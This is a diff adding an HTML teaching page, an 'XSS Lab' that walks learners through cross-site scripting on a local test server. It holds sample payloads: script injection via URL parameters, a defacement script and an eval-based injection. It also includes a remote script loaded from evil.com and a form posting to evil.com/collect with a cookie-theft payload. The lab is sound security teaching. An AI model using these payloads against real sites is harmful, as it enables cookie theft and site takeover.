@@ -1,0 +1,304 @@
+<html>
+    <html lang="en">
+        <head>
+            <meta charset="UTF-8" />
+            <meta
+                name="viewport"
+                content="width=device-width, initial-scale=1.0"
+            />
+            <title>XSS Lab</title>
+            <link rel="stylesheet" href="/styles.css" />
+        </head>
+        <body>
+            <h1>XSS Lab</h1>
+            <p>This page shows different forms of XSS to steal cookies</p>
+            <br /><br />
+            <h2>Where XSS can occur</h2>
+
+            Basically, wherever Javascript can exist, XSS may occur. In the
+            exercise below, we will demonstrate how to execute XSS attacks in
+            different contexts.
+
+            <h3>Script or Text?</h3>
+
+            Let's take a look at how Javascript is embedded into the DOM as
+            either executable code or as text.
+            <br />
+            <textarea rows="25%" cols="100%">
+
+========================================
+Javascript as Executable Code: 
+========================================
+
+1. Create new tab in browser and open developers console F12
+2. Paste this into your browser's debug console:
+   document.location.origin
+   document.getElementsByTagName('*')
+
+3. Paste this into your browser's address bar:
+   http://localhost:9081/xss-attack?xssvalue=HelloWorld
+
+
+4. Paste this into your browser's debug console:
+   document.getElementsByTagName('*')
+   document.body
+   document.getElementsByTagName('pre')[0].innerHTML
+   document.getElementsByTagName('pre')[0].outerHTML
+
+5. Has anything changed?
+
+
+6. Paste this into your browser's address bar:
+   http://localhost:9081/xss-attack?xssvalue=<script>alert("XSS attack 1")</script>
+
+7. Paste this into your browser's debug console:
+    document.getElementsByTagName('*')
+
+
+8. What has changed?
+9. Check out the script
+
+    document.getElementsByTagName('script')
+    document.getElementsByTagName('script')[0]
+
+10. Most importantly, check out the scripts origin. Does that
+    seem strange to you? Why?
+
+    document.location.origin
+    document.getElementsByTagName('script')[0].src
+
+11. See how the script is stored internally in the DOM:
+
+    document.getElementsByTagName('script')[0].innerHTML
+    document.getElementsByTagName('script')[0].outerHTML
+
+
+========================================
+Javascript as Text
+========================================
+
+12. Paste this into your browser's address bar:
+
+http://localhost:9081/xss-attack?xssvalue=' <script>  alert('XSS attack 2') </script>'
+
+13. In the console, see how the code above is stored as text in the DOM:
+
+    document.getElementsByTagName('*')
+    document.getElementsByTagName('pre')[0].innerHTML
+    document.getElementsByTagName('pre')[0].outerHTML
+
+
+14. Why is this script different than the one above?    
+
+</textarea
+            >
+
+            <hr />
+            <br /><br />
+            <hr />
+            <h2>Where Javascript can Occur</h2>
+            <hr />
+            <span> XSS inline </span>
+            <br /><br />
+            Javascript in its simplest form can exist as inline code. If an
+            attacker manages to inject Javascript into a HTML page/DOM, they can
+            execute any code they want. Example: Hacker stores a script in a
+            search form. When the server sends that script back to the browser,
+            the browser executes that script. This is the most common form of
+            XSS attack. NOTE: CSP forbids inline code no matter where it is
+            loaded from UNLESS there is a nonce(whitelist). So in the examples
+            below you will find inline code in many elements (i.e. button
+            onclick=) Look for the word "inline" in CSP error messages and then
+            hunt them down.
+            <br /><br />
+            <a href="/xss/xss-inline.html" target="”_blank”">XSS inline</a>
+            <br /><br />
+
+            <br /><br /><textarea rows="3" cols="100">
+    <script>document.body.innerHTML='defaced'</script>
+    </textarea
+            >
+
+            <hr />
+            <span> Inline event handler</span>
+            <br /><br />
+            Javascript execution can occur as an event handler. An event such as
+            pushing a button will cause some function to be executed. If an
+            attacker manages to inject ór corrupt this event handler in the DOM,
+            they can execute any code they want.
+            <p></p>
+            <ul>
+                <li>
+                    OhOh....First button didn't work? Why not? HINT: Has to do
+                    with modifying the DOM.
+                </li>
+                <li>addEventListener is better? Why?</li>
+            </ul>
+
+            <br /><br />
+            <a href="/xss/xss-event-handler.html" target="”_blank”"
+                >Inline event handler</a
+            >
+
+            <br /><br /><textarea rows="3" cols="100">
+      <button id="btn" onclick="doSomething()"></button>
+    </textarea
+            >
+
+            <hr />
+            <span> Internal script loading</span>
+            <br /><br />
+
+            Javascript execution can occur by loading JS code from an known
+            internal "good" source that is allowed to execute. But if that
+            "good" source is corrupted or injected, then the attacker can
+            execute any code they want.
+            <br /><br />
+
+            <a href="/xss/xss-internal-load.html" target="”_blank”"
+                >Internal script load</a
+            >
+
+            <br /><br /><textarea rows="3" cols="100">
+    <script src="https://localhost:3389/inline.js"></script>
+    </textarea
+            >
+
+            <hr />
+            <span> Remote script loading</span>
+            <br /><br />
+            Javascript execution can occur by loading JS code from an
+            unknown/known external "grey" source that is allowed to execute. But
+            if that "grey" source is corrupted or injected, then the attacker
+            can execute any code they want.
+            <br /><br />
+            <a href="/xss/xss-remote-foreign-load.html" target="”_blank”"
+                >Remote Script Load</a
+            >
+
+            <br /><br /><textarea rows="3" cols="100">
+    <script src="https://evil.com/hacked.js"></script>
+  </textarea
+            >
+
+            <hr />
+            <span> Text to script with eval</span>
+            <br /><br />
+            Javascript execution can occur by turning text into script with an
+            eval statement. If that text contains JS then the attacker can
+            execute any code they want.
+            <br /><br />
+            <a href="/xss/xss-eval-load.html" target="”_blank”"
+                >Script with Eval</a
+            >
+            <br /><br /><textarea rows="10" cols="100">
+    var op1 = getUrlParameter("op1"); 
+    var op2 = getUrlParameter("op2"); 
+    var sum =
+    eval(`${op1} + ${op2}`); 
+    console.log(`The sum is: ${sum}`); Inject XSS into
+  </textarea
+            >
+
+            <br /><br />
+            <hr />
+            <span> XSS in forms </span><br />
+
+            <br /><br />
+            Javascript execution almost anywhere where users can input data. The
+            classic example is in forms. If an attacker manages to inject
+            Javascript into a form, they can execute any code they want. One of
+            the most common types is called reflexive XSS. reflexive XSS is when
+            the attacker injects Javascript into a search form and the response
+            executes that JS code in the browser. The second type is stored XSS.
+            Stored XSS is when the attacker injects JS into a form and the
+            server stores that JS code in the database. When the server sends
+            that JS code back to the browser, the browser executes that JS code.
+
+            <br /><br />
+
+            <a href="/xss/xss-form.html" target="”_blank”">Script with Forms</a>
+            <br /><br />
+            <form method="POST" action="https://evil.com/collect">
+                <label>Username</label>
+                <input
+                    size="60"
+                    type="text"
+                    name="username"
+                    value="<script>alert(I have your cookies+ document.cookie)</script>
+      "
+                />
+            </form>
+
+            <br /><br />
+            <hr />
+            <span> java in pdf </span><br />
+
+            <br /><br />
+            PDFs contain Javascript. If an attacker manages to inject Javascript
+            into a PDF, they can execute any code they want.
+
+            <br /><br />
+            <a href="/xss/xss-pdf.html" target="”_blank”"> Script in PDF</a>
+
+            <br /><br />
+
+            <textarea rows="10" cols="100">
+      <object
+        type="application/pdf"
+        data="/media/examples/Evil.pdf"
+        width="250"
+        height="200"
+      ></object>
+
+
+      
+    </textarea
+            >
+
+            <br /><br />
+            <hr />
+            <span> Java in URL </span><br />
+            <br /><br />
+            Javascript execution can occur in the URL. If an attacker manages to
+            inject Javascript into the URL, they can execute any code they want.
+            <br /><br />
+            <a href="/xss/xss-urljavascript.html" target="”_blank”">
+                Script in URL</a
+            >
+            <br /><br />
+            <br /><br /><textarea rows="10" cols="60">
+        <a href="javascript: ...JS CODE...">js</a>
+
+
+
+
+    </textarea
+            >
+
+            <br /><br />
+            <hr />
+            <span> Anonymous Dynamic JS Functions </span><br />
+
+            Here is another way XSS can be introduced, via dynamically create
+            functions that are injected via some malicious input injection to
+            execute with the browser.
+
+            <br /><br />
+
+            <a href="/xss/xss-dynamic-function.html" target="_blank">
+                Execute this dynamic JS Function
+            </a>
+            <br />
+            <br />
+            <textarea rows="10" cols="50">
+function functionWithName(parameter1) {
+    return (parameter1)
+}
+            </textarea>
+
+            <br /><br /><br /><br />
+            <hr />
+        </body>
+    </html>
+</html>
